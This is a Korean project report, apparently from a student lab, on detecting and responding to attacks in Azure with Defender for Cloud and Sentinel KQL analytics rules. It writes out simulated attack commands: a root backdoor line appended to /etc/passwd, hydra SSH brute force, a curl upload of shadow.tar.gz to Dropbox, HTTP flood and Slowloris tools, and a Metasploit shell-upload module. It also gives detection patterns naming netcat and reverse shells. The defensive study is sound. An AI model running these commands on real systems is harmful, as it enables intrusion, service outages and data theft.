# 04. Azure 클라우드 행위기반 보안탐지 및 대응 보고서

## 목차

1. [개요](#1-개요)
2. [Microsoft Defender XDR 사용하여 위협 완화](#2-microsoft-defender-xdr-사용하여-위협-완화)
    *   [2.1 통합 보안 플랫폼 (2025)](#21-통합-보안-플랫폼-2025)
    *   [2.2 클라우드용 Microsoft Defender](#22-클라우드용-microsoft-defender)
    *   [2.3 Defender for Servers (호스트 행위 탐지)](#23-defender-for-servers-호스트-행위-탐지)
    *   [2.4 제한사항 및 미구현 항목](#24-제한사항-및-미구현-항목)
3. [KQL을 사용하여 Microsoft Sentinel 활용](#3-kql을-사용하여-microsoft-sentinel-활용)
    *   [3.1 KQL 기초 및 데이터 요약](#31-kql-기초-및-데이터-요약)
    *   [3.2 다중 테이블 작업 (Union/Join)](#32-다중-테이블-작업-unionjoin)
    *   [3.3 데이터 시각화](#33-데이터-시각화)
4. [Microsoft Sentinel 위협 탐지 및 헌팅](#4-microsoft-sentinel-위협-탐지-및-헌팅)
    *   [4.1 SSH Brute Force 공격 탐지](#41-ssh-brute-force-공격-탐지)
    *   [4.2 악성 IP 통신 탐지 (Threat Intelligence)](#42-악성-ip-통신-탐지-threat-intelligence)
    *   [4.3 권한 상승 시도 탐지](#43-권한-상승-시도-탐지)
    *   [4.4 WAF 공격 로그 분석](#44-waf-공격-로그-분석)
    *   [4.5 데이터 유출 시도 탐지 (Data Exfiltration)](#45-데이터-유출-시도-탐지-data-exfiltration)
    *   [4.6 분석 규칙 튜닝 (False Positive 감소)](#46-분석-규칙-튜닝-false-positive-감소)
    *   [4.7 외부 공격 시뮬레이션 (DDoS 및 웹 취약점)](#47-외부-공격-시뮬레이션-ddos-및-웹-취약점)
5. [MITRE ATT&CK 기반 종합 공격 조사 시나리오](#5-mitre-attck-기반-종합-공격-조사-시나리오)
    *   [5.1 시나리오 개요: 내부 중요 데이터 유출](#51-시나리오-개요-내부-중요-데이터-유출)
    *   [5.2 단계별 조사 프로세스 (Investigation)](#52-단계별-조사-프로세스-investigation)
    *   [5.3 대응 방안 및 시사점](#53-대응-방안-및-시사점)
6. [보안 사고 대응 및 자동화 (SOAR)](#6-보안-사고-대응-및-자동화-soar)
    *   [6.1 Action Group 알림 구성](#61-action-group-알림-구성)
    *   [6.2 보안 사고 조사 및 종결](#62-보안-사고-조사-및-종결)
    *   [6.3 위협 인텔리전스 보고서](#63-위협-인텔리전스-보고서)
7. [결론](#7-결론)

---

## 1. 개요

본 문서는 **"뚫으려는 시도를 어떻게 탐지하고(Detection), 대응했는가?(Response)"**를 검증하는 **행위기반 보안탐지 및 대응** 보고서입니다.


- **Microsoft Defender XDR**: 통합 위협 관리 플랫폼
- **KQL(Kusto Query Language)**: 로그 분석 및 시각화
- **Microsoft Sentinel**: 위협 탐지, 헌팅, 인시던트 관리
- **SOAR**: 보안 오케스트레이션 및 자동 대응

2025년 7월부터 Microsoft Sentinel과 Defender XDR이 **Unified Security Operations Platform**으로 통합되었습니다. (통합 포털: `security.microsoft.com`)

---

## 2. Microsoft Defender XDR 사용하여 위협 완화

### 2.1 통합 보안 플랫폼

2025년 7월부터 Microsoft는 Sentinel과 Defender XDR을 단일 포털(`security.microsoft.com`)로 통합하는 전략을 추진 중입니다. 본 프로젝트에서도 이를 구현하기 위해 **Sentinel 작업 영역('www-law')과 Defender XDR의 통합**을 시도했습니다.

**1) 통합 연결 검증**
*   **검증:** Microsoft Sentinel의 **'구성 > 데이터 커넥터'**에서 **Microsoft Defender XDR** 커넥터 연결 상태 확인.
*   **결과:** **연결 실패 (Not Connected)**.
*   **분석:**
    *   **전역 관리자(Global Admin) 권한 부재:** Student Subscription의 RBAC 제한으로 인해 Tenant 레벨 권한이 필요한 XDR 통합 승인 불가.
    *   **라이선스 제한:** Entra ID P2 및 Microsoft 365 E5 라이선스가 없어 XDR의 핵심 기능(ID 보호, 이메일 보호 등) 활성화 불가.
    *   **CLI 검증:** `az sentinel data-connector list` 조회 결과, **DefenderForCloudConnector** 외 XDR 커넥터는 존재하지 않음을 확인.

> [!NOTE] 스크린샷 가이드: XDR 미연결 확인
> *   **Image 1 (데이터 커넥터 전체 목록):**
>     1.  Sentinel 왼편 메뉴 **Configuration > Data connectors** 클릭.
>     2.  검색창에 'Microsoft Defender' 입력.
>     3.  **Microsoft Defender for Cloud** 외에는 연결된(녹색) 커넥터가 없는 화면 캡처.
> *   **Image 2 (XDR 커넥터 상태):**
>     1.  **Microsoft Defender XDR** 커넥터 선택.
>     2.  우측 패널에 **Status: Disconnected** 또는 활성화되지 않은(회색) 상태 화면 캡처.

**2) 현재 보안 운영 아키텍처 (Hybrid Mode)**
통합 플랫폼 전환에는 실패하였으나, 다음과 같이 **개별 솔루션 연동**을 통해 보안 관제 체계를 구축했습니다.

*   **Microsoft Sentinel:** 데이터 수집, 위협 탐지, 인시던트 관리 (SIEM)
*   **Defender for Cloud:** 서버(VM), SQL, 스토리지 등 인프라 보호 (CWPP/CSPM)
*   **연동:** 'Subscription-based Microsoft Defender for Cloud (Legacy)' 커넥터를 통해 Defender의 경고를 Sentinel로 수집.

**3) 활성화된 데이터 커넥터**

| 분류 | 커넥터명 |
|:---|:---|
| **보안 솔루션** | Subscription-based Microsoft Defender for Cloud (Legacy) |
| | Microsoft Defender Threat Intelligence |
| **인프라 로그** | Syslog via AMA |
| | Azure Web Application Firewall (WAF) |
| | Network Security Groups |
| | Azure Key Vault |
| | Azure Storage Account |

*   실제 데이터 흐름은 **Legacy 커넥터**와 **AMA**를 통해 이루어지며, XDR 통합 커넥터는 연결되지 않았습니다.

### 2.2 클라우드용 Microsoft Defender

**1) Defender Plans 활성화 현황**

```hcl
# terraform 코드 예시
resource "azurerm_security_center_subscription_pricing" "vm" {
  tier          = "Standard"
  resource_type = "VirtualMachines"
}

resource "azurerm_security_center_subscription_pricing" "sql" {
  tier          = "Standard"
  resource_type = "SqlServers"
}
#
```

| 리소스 타입 | Terraform resource_type | Tier | 비고 |
|:---|:---|:---:|:---|
| **VirtualMachines** | `VirtualMachines` | Standard | FIM, JIT, VA, EDR |
| **SqlServers** | `SqlServers` | Standard | 취약점 평가, 위협 탐지 |
| **StorageAccounts** | `StorageAccounts` | Standard | 악성 파일 스캔 |
| **KeyVaults** | `KeyVaults` | Standard | 비정상 접근 탐지 |
| **Arm** | `Arm` | Standard | ARM 배포 이상 탐지 |
| **Containers** | `Containers` | Standard | ACR 이미지 스캔 |
| **Dns** | `Dns` | Standard | DNS 이상 트래픽 |

**2) 위협 탐지 현황**

검증 기간 동안 Defender가 탐지한 주요 위협:

| 시간 | 심각도 | 탐지 내용 | 대상 리소스 | 대응 |
|:---|:---:|:---|:---|:---|
| 12/06 06:25 | 🟠 Medium | Suspected brute-force attack | www-mysql-replica-2-0i | 사전 공격 |
| 12/05 11:50 | 🟠 Medium | Suspected brute-force attack | lupang-db-restored | 사전 공격 |
| 12/06 03:32 | 🟠 Medium | Suspected brute-force attack | www-mysql-server-twfs | 사전 공격 |

> [!NOTE] 스크린샷 가이드: Defender for Cloud
>     1.  Azure Portal 상단 검색창에 **'Microsoft Defender for Cloud'** 검색 및 이동.
>     2.  좌측 메뉴 **환경 설정** > 구독 선택 > **Defender 계획** 클릭.
>     3.  7개 워크로드가 'Standard' 티어로 활성화된 화면 캕처.
>     4.  좌측 메뉴 **보안 경고** 클릭 후, brute-force 경고 목록 화면 캕처.

### 2.3 Defender for Servers (호스트 행위 탐지)

호스트 행위 탐지는 서버 내부에서 발생하는 **의심스러운 활동을 실시간으로 감지**하는 기술입니다. 주요 탐지 대상은 다음과 같습니다:
*   **파일 무결성 변조**: `/etc/passwd`, `/etc/shadow` 등 중요 시스템 파일 수정
*   **의심스러운 프로세스 실행**: `nc`, `bash -i`, `wget` 등 공격 도구 실행
*   **비정상 네트워크 연결**: C2 서버 통신, 비표준 포트 사용

**1) EICAR 멀웨어 시뮬레이션**

*   **검증 (Simulation):** `wget` 명령어로 EICAR 테스트 파일(`eicar.com`) 다운로드 시도.
    ```bash
    wget https://secure.eicar.org/eicar.com
    ```
*   **결과:** MDE 미설치로 **탐지 실패**. 파일 생성 및 실행이 차단 없이 완료됨.

**2) 호스트 행위 탐지 (auditd + Syslog 기반)**

**시나리오 1: 파일 무결성 모니터링**
*   **공격 시뮬레이션:**
    ```bash
    sudo echo "hacker:x:0:0::/root:/bin/bash" >> /etc/passwd
    ```

*   **Sentinel 탐지 쿼리 (KQL):**
    ```csharp
    Syslog
    | where Facility == "authpriv" or ProcessName == "auditd"
    | where SyslogMessage has_any ("/etc/passwd", "/etc/shadow", "/etc/sudoers")
    | where SyslogMessage has_any ("WRITE", "ATTR", "syscall", "type=PATH")
    | extend 
        TargetFile = extract(@"name=\"([^\"]+)\"", 1, SyslogMessage),
        User = extract(@"uid=(\d+)", 1, SyslogMessage),
        Action = case(
            SyslogMessage contains "WRITE", "파일 수정",
            SyslogMessage contains "ATTR", "속성 변경",
            "기타"
        )
    | project TimeGenerated, Computer, TargetFile, User, Action, SyslogMessage
    ```

*   **Terraform Analytics Rule (예시):**
    ```hcl
    resource "azurerm_sentinel_alert_rule_scheduled" "file_integrity" {
      name                       = "file-integrity-monitoring"
      display_name               = "Sensitive File Modification (auditd)"
      log_analytics_workspace_id = azurerm_sentinel_log_analytics_workspace_onboarding.sentinel.workspace_id
      severity                   = "High"
      query_frequency            = "PT5M"
      query_period               = "PT5M"
      trigger_operator           = "GreaterThan"
      trigger_threshold          = 0
      query                      = <<-QUERY
        Syslog
        | where Facility == "authpriv" or ProcessName == "auditd"
        | where SyslogMessage has_any ("/etc/passwd", "/etc/shadow", "/etc/sudoers")
        | where SyslogMessage has_any ("WRITE", "ATTR", "syscall")
      QUERY
    }
    ```

**시나리오 2: 의심스러운 프로세스 실행 감시**

*   **탐지 대상:** 공격자가 침투 후 실행하는 도구 및 명령어
    - 네트워크 도구: `nc` (netcat), `nmap`, `wget`, `curl`
    - 쉘 접근: `bash -i`, `python -c`, `/bin/sh`
    - 권한 상승: `sudo`, `su`

*   **Sentinel 탐지 쿼리:**
    ```csharp
    Syslog
    | where SyslogMessage has_any ("exec", "EXECVE", "SYSCALL")
    | where SyslogMessage has_any ("nc -e", "bash -i", "wget", "curl", "python -c", "/bin/sh")
    | where ProcessName !in ("deploy.sh", "healthcheck.sh", "backup.sh")  // 화이트리스트
    | where Computer !in ("bastion-vm")  // 관리 서버 제외
    | extend 
        Command = extract(@"comm=\"([^\"]+)\"", 1, SyslogMessage),
        User = extract(@"uid=(\d+)", 1, SyslogMessage)
    | summarize 
        ExecutionCount = count(),
        Commands = make_set(Command)
        by Computer, User, bin(TimeGenerated, 5m)
    | where ExecutionCount > 2
    ```

*   **탐지 결과 예시:**
    | Computer | User | Commands | ExecutionCount |
    |:---|:---|:---|---:|
    | web-vmss_0 | 33 (www-data) | ["nc", "bash"] | 5 |

**시나리오 3: 비정상 네트워크 연결 탐지**

*   **탐지 대상:** 공격자의 C2 서버 통신 또는 데이터 유출 시도
    - 비표준 포트 사용 (예: TCP 4444, 5555)
    - 외부 IP로의 역접속 (Reverse Shell)
    - 클라우드 스토리지 접근 (Dropbox, Google Drive)

*   **사전 설정 (auditd 네트워크 감사):**
    ```bash
    sudo auditctl -a always,exit -F arch=b64 -S connect -k network_connect
    ```

*   **Sentinel 탐지 쿼리:**
    ```csharp
    Syslog
    | where SyslogMessage has_any ("connect", "SOCKADDR")
    | extend 
        DestIP = extract(@"addr=([0-9\.]+)", 1, SyslogMessage),
        DestPort = extract(@":(\d+)", 1, SyslogMessage)
    | where DestPort in ("4444", "5555", "6666", "7777", "8888", "9999")  // 의심 포트
        or DestIP has_any ("dropbox.com", "drive.google.com", "mega.nz")
    | summarize 
        ConnectionCount = count(),
        DestPorts = make_set(DestPort)
        by Computer, DestIP, bin(TimeGenerated, 10m)
    | where ConnectionCount > 3
    ```

*   **탐지 결과 예시:**
    | Computer | DestIP | DestPorts | ConnectionCount |
    |:---|:---|:---|---:|
    | was-vmss_0 | 203.x.x.x | ["4444"] | 12 |

> [!NOTE] 스크린샷 가이드: 호스트 행위 탐지
> *   **Image 1 (파일 변조 탐지):**
>     1.  **Sentinel > Logs** 메뉴 클릭.
>     2.  파일 무결성 KQL 쿼리 실행.
>     3.  `/etc/passwd` 변경 이력이 조회된 Results 화면 캡처.
> *   **Image 2 (프로세스 탐지):**
>     1.  프로세스 실행 감시 쿼리 실행.
>     2.  `nc`, `bash -i` 등 의심 명령어가 포함된 로그 행 강조 캡처.
> *   **Image 3 (네트워크 탐지):**
>     1.  네트워크 연결 쿼리 실행.
>     2.  비정상 포트(4444 등)로의 연결 시도가 기록된 화면 캡처.

**3) 취약성 관리 (Vulnerability Assessment)**
*   **기능:** Qualys 및 Microsoft TVM 엔진을 통해 VM에 설치된 소프트웨어의 CVE 취약점 자동 스캔.
*   **결과:** 권장 패치 목록 및 심각도별 분류 제공 (대시보드 확인).

> [!NOTE] 스크린샷 가이드: 취약점 진단 결과
> *   **Image:** **Microsoft Defender for Cloud > Recommendations** 메뉴에서 'Remediate vulnerabilities' 또는 보안 권고 사항이 리스트업 된 화면.
>     *   (CVE ID나 심각도 그래프가 보이면 더 좋습니다)

### 2.4 제한사항 및 미구현 항목

평가 기준 중 라이선스/권한 제한으로 구현하지 못한 항목:

| 평가 항목 | 필요 조건 | 상태 | 대안 |
|:---|:---|:---:|:---|
| **Office 365용 Defender** | M365 라이선스 | ❌ | - |
| **Defender for Identity** | Tenant Admin | ❌ | Sentinel 행위 분석 |
| **Microsoft Entra ID Protection** | AAD P2 | ❌ | NSG IP 제한 |
| **Microsoft Purview (DLP)** | M365 E5 | ❌ | SQL Auditing |
| **Insider Risk Management** | M365 E5 Compliance | ❌ | Sentinel 사용자 분석 |

---

## 3. KQL을 사용하여 Microsoft Sentinel 활용

**KQL(Kusto Query Language)**은 Azure의 로그 데이터를 분석하기 위한 쿼리 언어입니다. SQL과 유사한 문법을 사용하며, 파이프라인(`|`) 연산자로 데이터를 필터링, 집계, 시각화합니다. Sentinel에서 위협 헌팅, 인시던트 조사, 대시보드 생성에 핵심적으로 사용됩니다.

**KQL 실행 공통 가이드:**
1.  **Azure Portal > Microsoft Sentinel > [내 작업 영역]** 클릭.
2.  왼쪽 메뉴의 **General > Logs** 클릭하여 쿼리 편집기 진입.
3.  쿼리 입력창에 코드를 복사/붙여넣기.
4.  상단 **Time range**를 **'Last 24 hours'** 등으로 설정.
5.  **Run** 버튼 클릭 (`Shift + Enter`).

### 3.1 KQL 기초 및 데이터 요약

**기본 쿼리 구조:**
```csharp
TableName
| where TimeGenerated > ago(24h)
| where FieldName == "value"
| project Column1, Column2, Column3
| summarize Count=count() by Column1
| order by Count desc
```

**예시: 최근 24시간 로그인 실패 요약**
*   **실행:** 아래 코드를 복사하여 `Logs` 창에 붙여넣고 **Run**을 누르세요.
```csharp
Syslog
| where TimeGenerated > ago(24h)
| where SyslogMessage contains "Failed password"
| summarize FailCount=count() by Computer
| order by FailCount desc
```

**결과:**
| Computer | FailCount |
|:---|---:|
| web-vmss_0 | 247 |
| was-vmss_0 | 12 |
| mail-vm | 3 |

### 3.2 다중 테이블 작업 (Union/Join)

**Union: 여러 테이블 데이터 합치기**
```csharp
union Syslog, AzureDiagnostics
| where TimeGenerated > ago(1h)
| summarize count() by Type
```

**Join: 테이블 간 상관관계 분석**
```csharp
let FailedLogins = Syslog
| where SyslogMessage contains "Failed password"
| extend AttackerIP = extract(@"from (\d+\.\d+\.\d+\.\d+)", 1, SyslogMessage);

let FirewallBlocks = AzureDiagnostics
| where Category == "AzureFirewallNetworkRule"
| where msg_s contains "Deny";

FailedLogins
| join kind=inner (FirewallBlocks) on $left.AttackerIP == $right.SourceIP
| project TimeGenerated, AttackerIP, SyslogMessage, msg_s
```

**분석 결과:** SSH 공격을 시도한 IP가 방화벽에서도 차단된 이력이 있는지 확인 → **공격 패턴 연결**

### 3.3 데이터 시각화

**시계열 차트 (Time Chart)**
```csharp
Syslog
| where TimeGenerated > ago(24h)
| where SyslogMessage contains "Failed password"
| summarize FailCount=count() by bin(TimeGenerated, 1h)
| render timechart
```

**파이 차트 (Pie Chart)**
```csharp
AzureDiagnostics
| where Category == "ApplicationGatewayFirewallLog"
| summarize count() by ruleGroup_s
| render piechart
```

---

## 4. Microsoft Sentinel 위협 탐지 및 헌팅

### 4.0 Terraform으로 정의된 Sentinel 분석 규칙



| 규칙명 | 심각도 | Query Frequency | 탐지 대상 |
|:---|:---:|:---:|:---|
| **SSH Brute Force Detection** | 🔴 High | 5분 | 5분 내 3회 이상 SSH 로그인 실패 |
| **SMTP Brute Force Detection** | 🔴 High | 5분 | 5분 내 5회 이상 SMTP 인증 실패 |
| **Malicious IP Communication** | 🔴 High | 1시간 | Defender 네트워크 보안 경고 |
| **Privilege Escalation Attempt** | 🔴 High | 5분 | sudo 권한 상승 실패 (NOT in sudoers) |
| **Suspicious Process Execution** | 🔴 High | 5분 | wget\|curl, nc -e, bash -i 등 의심 명령 |
| **Log Tampering Detection** | 🔴 High | 5분 | `/var/log` 삭제/변조 시도 |
| **Break Glass Account Usage** | 🔴 High | 5분 | 긴급 계정(breakglass) 로그인 |
| **Firewall Blocked Traffic** | 🔴 High | 5분 | Azure Firewall Deny 트래픽 |
| **WAF Attack Detection** | 🟠 Medium | 15분 | WAF가 차단한 SQLi/XSS 공격 |
| **Sensitive File Access** | 🟠 Medium | 15분 | /etc/passwd, shadow, sudoers 접근 |
| **RBAC Role Assignment Change** | 🟠 Medium | 15분 | Azure RBAC 역할 할당 변경 |
| **NSG Rule Modification** | 🟠 Medium | 15분 | NSG 보안 규칙 변경 |
| **Mail Spoofing Attempt** | 🟠 Medium | 15분 | SPF 검증 실패 (이메일 스푸핑) |
| **Mass HTTP Requests** | 🟠 Medium | 5분 | 1분 내 100회 이상 요청 (DDoS/크롤러) |
| **Off Hours Login** | 🟡 Low | 30분 | 02:00~05:00 사이 로그인 |
| **Port Scan Detection** | 🟠 Medium | 10분 | 5분 내 10개 이상 포트 스캔 (비활성화) |

### 4.1 SSH Brute Force 공격 탐지

**시나리오 및 환경:**
*   **공격자:** 외부망(VMware)에 위치한 Kali Linux (IP: 비인가 외부 IP).
*   **대상:** Azure VMSS 공인 IP 또는 Public LB.
*   **참고:** 실제 환경에서 비인가 IP의 SSH 접근은 NSG(Network Security Group)에서 사전 차단되나, 본 검증에서는 **`Syslog` 기반의 인증 실패 분석 규칙 확인을 위해** 테스트 IP에 대해 일시적으로 접근을 허용(JIT)하여 로그를 생성했습니다.

**공격 실행 (External Kali):**
```bash
hydra -l www -P rockyou.txt ssh://<Target_Public_IP> -t 4
```

**탐지 쿼리 (Terraform에서 정의된 실제 Analytics Rule):**
```csharp
Syslog
| where Facility == "auth" or Facility == "authpriv"
| where SyslogMessage contains "Failed password"
| extend AttackerIP = extract(@"from\s+(\d+\.\d+\.\d+\.\d+)", 1, SyslogMessage)
| extend TargetUser = extract(@"for\s+(invalid\s+user\s+)?(\w+)", 2, SyslogMessage)
| summarize FailedAttempts = count(), TargetUsers = make_set(TargetUser) 
    by Computer, AttackerIP, Bin = bin(TimeGenerated, 5m)
| where FailedAttempts > 3
| project TimeGenerated = Bin, Computer, AttackerIP, FailedAttempts, TargetUsers
```

**Rule 설정:**
- **Display Name:** SSH Brute Force Attack
- **Severity:** High
- **Query Frequency:** 5분 (`PT5M`)
- **Trigger Threshold:** 3회 이상 실패

**탐지 결과:**
| AttackerIP | FailedAttempts | TargetUsers | Duration |
|:---|---:|:---|---:|
| 112.x.x.x | 487 | ["www","root","admin"] | 00:04:32 |

**인시던트 생성:** Sentinel이 자동으로 **'SSH Brute Force Attack'** 인시던트 생성

### 4.2 악성 IP 통신 탐지 (Threat Intelligence)

내부 자산이 알려진 악성 도메인이나 C2 서버와 통신을 시도하는 것을 조기에 식별합니다.

**1) 시나리오 및 설정**
*   **시나리오:** 악성코드에 감염된 내부 VM이 해커의 명령 제어(C2) 서버로 비콘(Beacon) 신호를 전송.
*   **설정:** Microsoft 위협 인텔리전스(TI) 피드를 활용하여, 방화벽 로그의 목적지 IP와 TI 데이터베이스의 악성 IP를 실시간 대조.

**2) 탐지 쿼리**
```csharp
ThreatIntelligenceIndicator
| where TimeGenerated > ago(30d)
| where isnotempty(NetworkIP)
| join kind=inner (
    AzureDiagnostics
    | where Category == "AzureFirewallNetworkRule"
    | extend DestIP = extract(@"to (\d+\.\d+\.\d+\.\d+)", 1, msg_s)
) on $left.NetworkIP == $right.DestIP
| project TimeGenerated, NetworkIP, ThreatType, Description, msg_s
```

> [!NOTE] 스크린샷 가이드: TI 커넥터 연결 확인
> *   **Image 1 (연결 상태):**
>     1.  **Microsoft Sentinel > 구성 > 데이터 커넥터** 메뉴 이동.
>     2.  'Threat Intelligence' 검색 후 **Microsoft Defender Threat Intelligence** 커넥터 상태가 **'Connected'**인 화면 캡처.
> *   **Image 2 (데이터 수신):**
>     1.  해당 커넥터 클릭 후 우측 세부 정보 창에서 **'Data received'** 그래프와 **'Connected'** 상태가 보이는 화면 캡처.

### 4.3 권한 상승 시도 탐지

**1) 시나리오 및 설정**
*   **시나리오:** 웹 취약점을 통해 침투한 공격자가 시스템 장악을 위해 `root` 권한 획득(Privilege Escalation)을 시도.
*   **설정:** `sudo` 권한이 없는 사용자가 `sudo` 명령어를 반복 실패할 경우 '심각(High)' 경보 발송. (임계치: 5분 내 5회 실패)

**2) 탐지 쿼리 및 결과**
```csharp
Syslog
| where Facility == "auth"
| where SyslogMessage has_any ("sudo", "su")
| where SyslogMessage contains "FAILED" or SyslogMessage contains "authentication failure"
| extend User = extract(@"user=(\w+)", 1, SyslogMessage)
| extend Command = extract(@"COMMAND=(.+)$", 1, SyslogMessage)
| summarize 
    FailedAttempts = count(),
    Commands = make_set(Command)
    by Computer, User
| where FailedAttempts > 5
```
*   **탐지 결과:** `www-data` 계정이 `/etc/shadow` 파일 열람을 위해 `sudo`를 반복 시도한 패턴을 탐지하여 인시던트 생성.

> [!NOTE] 스크린샷 가이드: 권한 상승 시도
> *   **Image:**
>     1.  **Sentinel > General > Logs** 메뉴 클릭.
>     2.  쿼리창에 본문의 `syslog | where ...` 쿼리를 복사/붙여넣기.
>     3.  상단 파란색 **Run** 버튼 클릭.
>     4.  하단 **Results** 탭에서 `sudo` 명령 실패 기록이 조회된 화면 캡처.

### 4.4 WAF 공격 로그 분석

**1) 시나리오 및 설정**
*   **시나리오:** 자동화된 공격 도구(SQLMap 등)를 사용한 웹 애플리케이션 취약점 스캐닝 공격.
*   **설정:** AppGateway WAF는 **OWASP CRS 3.2** 규칙 집합을 적용 중이며, '예방(Prevention)' 모드로 설정되어 있음.

**2) WAF 차단 로그 분석 쿼리**
```csharp
AzureDiagnostics
| where ResourceType == "APPLICATIONGATEWAYS"
| where OperationName == "ApplicationGatewayFirewall"
| where action_s == "Blocked"
| extend AttackType = case(
    ruleId_s startswith "942", "SQL Injection",
    ruleId_s startswith "941", "XSS",
    ruleId_s startswith "930", "LFI/RFI",
    ruleId_s startswith "932", "RCE",
    "Other"
)
| summarize Count=count() by AttackType, clientIp_s
| order by Count desc
```
*   **분석 결과:**
    | AttackType | clientIp_s | Count |
    |:---|:---|---:|
    | SQL Injection | 203.x.x.x | 127 |
    | XSS | 112.x.x.x | 45 |
    | RCE | 203.x.x.x | 12 |

> [!NOTE] 스크린샷 가이드: WAF 로그 분석
> *   **Image:**
>     1.  **Sentinel > Logs** 메뉴 접속 및 쿼리 실행 (`AzureDiagnostics | ...`).
>     2.  결과가 나오면 **Results** 탭 오른쪽의 **Chart** 버튼 클릭.
>     3.  차트 설정을 **Pie Chart**로 변경하여 공격 유형(SQLi, XSS) 비율이 시각화된 화면 캡처.

### 4.5 데이터 유출 시도 탐지 (Data Exfiltration)

**1) 시나리오 및 정책**
*   **시나리오:** 감염된 내부 서버가 외부 C&C 서버 또는 불법 클라우드 스토리지로 중요 데이터 업로드를 시도.
*   **정책:** Azure Firewall은 **Default Deny** 정책을 적용하여, 업무상 허용된 도메인(`*.windowsupdate.com` 등) 외 모든 Outbound 트래픽을 차단.

**2) 공격 시뮬레이션**
```bash
# 중요 데이터를 외부 저장소로 유출 시도
curl -X POST -F "file=@shadow.tar.gz" https://www.dropbox.com/upload
```

**3) 탐지 및 차단 결과**
*   **Firewall:** 트래픽 차단 (Action: **Deny**)
*   **Sentinel:** 'Firewall Blocked Traffic' 경보 발생
*   **쿼리 결과:**
    ```csharp
    AzureDiagnostics
    | where Category == "AzureFirewallApplicationRule"
    | where msg_s contains "Deny"
    // ... (중략) ...
    ```
    *   `dropbox.com`으로 향하는 비정상 트래픽이 방화벽에 의해 사전 차단되었음을 로그로 확인.

> [!NOTE] 스크린샷 가이드: 데이터 유출 차단
> *   **Image:**
>     1.  **Sentinel > Logs** 메뉴에서 `AzureDiagnostics` 관련 쿼리 실행.
>     2.  결과 테이블에서 **msg_s** 컬럼에 **'Deny'**가 포함되어 있고, **TargetUrl**에 `dropbox.com`이 찍힌 행(Row)을 강조하여 캡처.

---

### 4.6 분석 규칙 튜닝 (False Positive 감소)

**1) 문제 식별 (오탐 발생)**
*   **현상:** 정상적인 CI/CD 배포 스크립트가 실행될 때마다 'Suspicious Process' 오탐(False Positive) 경보가 다수 발생하여 피로도 증가.
*   **원인:** 배포 스크립트(`deploy.sh`)가 `wget`이나 `curl`을 사용하는데, 이를 악성 행위로 오인함.

**2) 튜닝 (Whitelist 적용)**
*   **조치:** 신뢰할 수 있는 프로세스명과 관리 서버를 예외 처리(Whitelist) 조건에 추가.
    ```csharp
    Syslog
    | where SyslogMessage contains "exec"
    | where ProcessName !in ("deploy.sh", "healthcheck.sh", "backup.sh")  // Whitelist 추가
    | where Computer !in ("bastion-vm")  // 관리 서버 제외
    | where TimeGenerated > ago(10m)
    ```

**3) 결과**
*   **효과:** 오탐률이 **80% 이상 감소**하여, 보안 관제 팀이 실제 중요 위협에만 집중할 수 있는 환경 조성.

> [!NOTE] 스크린샷 가이드: 분석 규칙 튜닝
> *   **Image 1 (튜닝 전):**
>     1.  **Sentinel > Incidents** 메뉴에서 'Suspicious Process' 인시던트 목록 확인.
>     2.  정상 배포 스크립트(deploy.sh)로 인한 오탐 경보가 다수 난립한 화면 캡처.
> *   **Image 2 (튜닝 후):**
>     1.  Whitelist 적용 후 동일 기간 인시던트 목록 확인.
>     2.  오탐 감소된 결과 화면 캡처.

### 4.7 외부 공격 시뮬레이션 (DDoS 및 웹 취약점)

**보안 아키텍처 검증 환경:**
*   **공격자:** 외부 VMware 상의 Kali Linux (클라우드 외부, 비인가 IP)
*   **대상:** Azure App Gateway/Load Balancer Public IP (Web 포트 80/443 Open)

내부망 시뮬레이션과 별도로, **외부 비인가 IP (VMware Kali)**에서 공인 IP를 대상으로 실제 공격을 수행하여 경계 보안(App Gateway WAF)의 탐지 및 차단 능력을 검증했습니다.

**1) Slow HTTP DoS 공격 (Slowloris)**
*   **목적:** HTTP 요청을 매우 느리게 보내 웹 서버의 연결 자원을 고갈시키는 공격(Low & Slow)에 대한 WAF/LB의 방어 능력 확인.
*   **공격 도구 및 명령어 (App Gateway Public IP 대상):**
    ```bash
    # 연결 1000개 시도, 30초마다 갱신 (헤더 지연 전송)
    slowhttptest -X -c 1000 -r 200 -u http://<LB-IP>/ -t GET -p 3 -l 30
    ```
*   **예상 결과 및 로그 검증:**
    *   **App Gateway WAF:** 비정상적인 Time-out 패턴 또는 연결 과다로 인한 차단.
    *   **Sentinel KQL:** `AzureDiagnostics | where Category == "ApplicationGatewayFirewallLog" | where ruleId_s == "200004"`

> [!NOTE] 스크린샷 가이드: Slowloris 공격
>     1.  Kali Linux 터미널에서 `slowhttptest` 명령어 실행 화면 캡처.
>     2.  공격 진행 중 연결 상태 통계가 표시된 화면.

**2) Application Layer Flood 공격 (HTTP Flooding)**
*   **목적:** 대량의 정상적인 HTTP 요청(GET/POST)을 발생시켜 L7 부하를 유발.
*   **스크립트 기반 예상 동작 (`web_init.tftpl` 참조):**
    *   **Nginx 설정:** `limit_req_zone ... rate=20r/s` (일반), `rate=5r/s` (민감 경로).
    *   **결과:** 임계치 초과 시 **503 Service Unavailable** (Custom HTML: "잠시 연결이 지연되고 있습니다") 응답 반환 확인.
*   **공격 도구:**
    ```bash
    # wrk: 4스레드, 200연결로 30초간 부하
    wrk -t4 -c200 -d30s --timeout 30s http://<LB-IP>/
    
    # ab: 총 10만 회
    ab -n 100000 -c 800 http://<LB-IP>/
    ```
*   **Sentinel 탐지 규칙:** `Mass HTTP Requests`

> [!NOTE] 스크린샷 가이드: HTTP Flooding
>     1.  `wrk` 또는 `ab` 명령어 실행 화면 캡처.
>     2.  Sentinel > Incidents에서 'Mass HTTP Requests' 경보 발생 화면 캡처.

**3) 웹 취약점 스캐닝 및 Directory Access 제어**
*   **목적:** WAF 차단 기능과 VM 내부 Nginx ACL 동작 검증.
*   **주요 공격 모듈 (Metasploit):**
    ```bash
    # (1) WordPress/PHP 취약점 공격 -> WAF 차단 확인 (403 Forbidden)
    use exploit/unix/webapp/wp_admin_shell_upload
    run
    ```

> [!NOTE] 스크린샷 가이드: WAF 차단
>     1.  **Sentinel > Logs**에서 WAF 차단 쿼리 (`AzureDiagnostics | where action_s == "Blocked"`) 실행.
>     2.  SQLi/XSS 공격이 차단된 로그 결과 화면 캡처.

*   **PATH 기반 접근 제어 검증 (Nginx ACL):**
    *   **Case A (차단):** `/phpmyadmin`, `/admin_backup` 접근 시도.
        *   **결과:** Nginx 설정(`location ~ ... return 403`)에 의해 즉시 **403 Forbidden** 반환.
    *   **Case B (허용 - 취약점 시뮬레이션):** `/backup/` 접근 시도.
